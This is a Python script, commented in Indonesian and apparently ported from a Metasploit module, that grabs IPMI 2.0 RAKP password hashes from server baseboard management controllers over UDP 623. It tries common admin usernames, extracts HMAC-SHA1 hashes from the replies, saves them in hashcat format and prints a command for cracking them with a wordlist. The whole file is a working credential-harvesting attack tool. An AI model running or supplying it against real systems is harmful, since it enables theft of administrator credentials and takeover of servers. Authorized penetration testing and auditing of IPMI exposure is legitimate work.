#!/usr/bin/env python3
"""
IPMI 2.0 RAKP Hash Grabber (UDP 623)
Port dari metasploit auxiliary/scanner/ipmi/ipmi_dumphashes.
Output: format hashcat -m 7300 (IPMI2 RAKP HMAC-SHA1) -> user:salt:hmac

Usage:
  python3 ipmi_rakp_grab.py <IP>            # auto coba username umum
  python3 ipmi_rakp_grab.py <IP> -u admin   # username tertentu
  python3 ipmi_rakp_grab.py <IP> -o hash.txt
"""

import argparse
import os
import socket
import sys
import time

RMCP = bytes([0x06, 0x00, 0xFF, 0x07])
DEFAULT_USERS = ["admin", "ADMIN", "Administrator", "root"]
PRIV = 0x14  # requested max privilege + name-lookup flag (konstanta modul msf)


def _packet(payload_type: int, data: bytes) -> bytes:
    # RMCP header + RMCP+ header (auth 0x06, payload type, session id 4B, seq 4B, len 2B)
    return RMCP + bytes([0x06, payload_type]) + b"\x00" * 8 + len(data).to_bytes(2, "little") + data


def session_open_request(console_sid: bytes) -> bytes:
    data = (
        b"\x00\x00\x00\x00"  # message tag, privilege, reserved
        + console_sid
        + bytes([0x00, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00,
                 0x01, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00,
                 0x02, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00])
    )
    return _packet(0x10, data)


def rakp1_request(bmc_sid: bytes, console_random: bytes, username: bytes) -> bytes:
    data = (
        b"\x00\x00\x00\x00"
        + bmc_sid
        + console_random
        + bytes([PRIV, 0x00, 0x00, len(username)])
        + username
    )
    return _packet(0x12, data)


def parse_reply(resp: bytes, want_payload_type: int):
    """Balikin (error_code, data) atau None kalau bukan tipe payload yang ditunggu."""
    if len(resp) < 20 or resp[:4] != RMCP:
        return None
    if resp[5] & 0x3F != want_payload_type:  # 2 bit atas = encrypted/authenticated flag
        return None
    return resp[17], resp[20:]


def build_hash_line(username: bytes, con_sid: bytes, bmc_sid: bytes,
                    con_rid: bytes, bmc_rid: bytes, guid: bytes, hmac: bytes) -> str:
    salt = con_sid + bmc_sid + con_rid + bmc_rid + guid + bytes([PRIV, len(username)]) + username
    return f"{username.decode()}:{salt.hex()}:{hmac.hex()}"


def grab(sock, ip, port, username: bytes, timeout: float):
    """Return hashcat line atau None."""
    console_sid = os.urandom(4)
    console_rand = os.urandom(16)

    # --- Open Session ---
    req = session_open_request(console_sid)
    reply = None
    for _ in range(3):
        sock.sendto(req, (ip, port))
        try:
            reply, _ = sock.recvfrom(1024)
            break
        except socket.timeout:
            pass
    if reply is None:
        print(f"[!] {ip}: tidak ada respons Open Session (IPMI/RMCP+ tidak aktif di UDP {port}?)")
        return None
    parsed = parse_reply(reply, 0x11)
    if parsed is None:
        print(f"[!] {ip}: respons Open Session tidak bisa dipahami")
        return None
    if len(parsed[1]) < 8:
        print(f"[!] {ip}: Open Session ditolak (status {parsed[0]})")
        return None
    bmc_sid = parsed[1][4:8]

    # --- RAKP1 -> RAKP2 (retry kalau BMC kirim error session id, quirk iLO) ---
    for attempt in range(3):
        req = rakp1_request(bmc_sid, console_rand, username)
        reply = None
        for _ in range(3):
            sock.sendto(req, (ip, port))
            try:
                reply, _ = sock.recvfrom(1024)
                break
            except socket.timeout:
                pass
        if reply is None:
            print(f"[!] {ip}: tidak ada respons RAKP2 untuk '{username.decode()}'")
            return None
        parsed = parse_reply(reply, 0x13)
        if parsed is None:
            print(f"[!] {ip}: respons RAKP2 tidak bisa dipahami")
            return None
        err, data = parsed
        if err == 2:  # invalid session id -> retry
            time.sleep(1)
            continue
        if err != 0:
            print(f"[!] {ip}: '{username.decode()}' -> RAKP2 error code {err} (username salah / ditolak)")
            return None
        if len(data) < 56:
            print(f"[!] {ip}: '{username.decode()}' -> data RAKP2 tidak lengkap")
            return None
        bmc_rand, guid, hmac = data[4:20], data[20:36], data[36:56]
        return build_hash_line(username, console_sid, bmc_sid, console_rand, bmc_rand, guid, hmac)
    print(f"[!] {ip}: '{username.decode()}' -> session id error terus")
    return None


def selftest():
    # Rekonstruksi contoh hash (format hashcat 7300) dari komponennya
    line = build_hash_line(
        b"admin",
        bytes.fromhex("16ac9ba3"),
        bytes.fromhex("82de0c00"),
        bytes.fromhex("8cce3752c009221752f8407e253ea959"),
        bytes.fromhex("059aac3a82754f38ed00090869a824ff"),
        bytes.fromhex("a123456789abcdefa123456789abcdef"),
        bytes.fromhex("3a02c7ed2529d0ba46001a3479e89543254f1263"),
    )
    expected = ("admin:16ac9ba382de0c008cce3752c009221752f8407e253ea959059aac3a82754f38"
                "ed00090869a824ffa123456789abcdefa123456789abcdef140561646d696e"
                ":3a02c7ed2529d0ba46001a3479e89543254f1263")
    assert line == expected, f"MISMATCH:\n{line}\n{expected}"
    print("[+] selftest OK — format sesuai hashcat -m 7300")


def main():
    ap = argparse.ArgumentParser(description="IPMI 2.0 RAKP hash grabber (hashcat -m 7300)")
    ap.add_argument("target", nargs="?", help="IP target BMC")
    ap.add_argument("-p", type=int, default=623, help="port UDP (default 623)")
    ap.add_argument("-u", nargs="*", default=DEFAULT_USERS, help="username(s) untuk dicoba")
    ap.add_argument("-U", help="file berisi daftar username (satu per baris)")
    ap.add_argument("-t", type=float, default=5.0, help="timeout detik (default 5)")
    ap.add_argument("-o", help="simpan hasil ke file (format hashcat)")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()

    if args.selftest:
        selftest()
        return
    if not args.target:
        ap.error("masukkan IP target (atau --selftest)")
    users = list(args.u)
    if args.U:
        with open(args.U) as f:
            users += [u.strip() for u in f if u.strip()]
        users = list(dict.fromkeys(users))  # buang duplikat, urutan tetap

    found = []
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(args.t)
        for user in users:
            print(f"[*] {args.target}: mencoba username '{user}' ...")
            line = grab(s, args.target, args.p, user.encode(), args.t)
            if line:
                print(f"[+] Hash found: {line}")
                found.append(line)

    if found:
        if args.o:
            with open(args.o, "w") as f:
                f.write("\n".join(found) + "\n")
            print(f"[*] {len(found)} hash disimpan ke {args.o}")
        print(f"[*] Crack: hashcat -m 7300 {args.o or '(file)'} /usr/share/wordlists/rockyou.txt")
    else:
        print("[-] Tidak ada hash yang didapat")
        sys.exit(1)


if __name__ == "__main__":
    main()
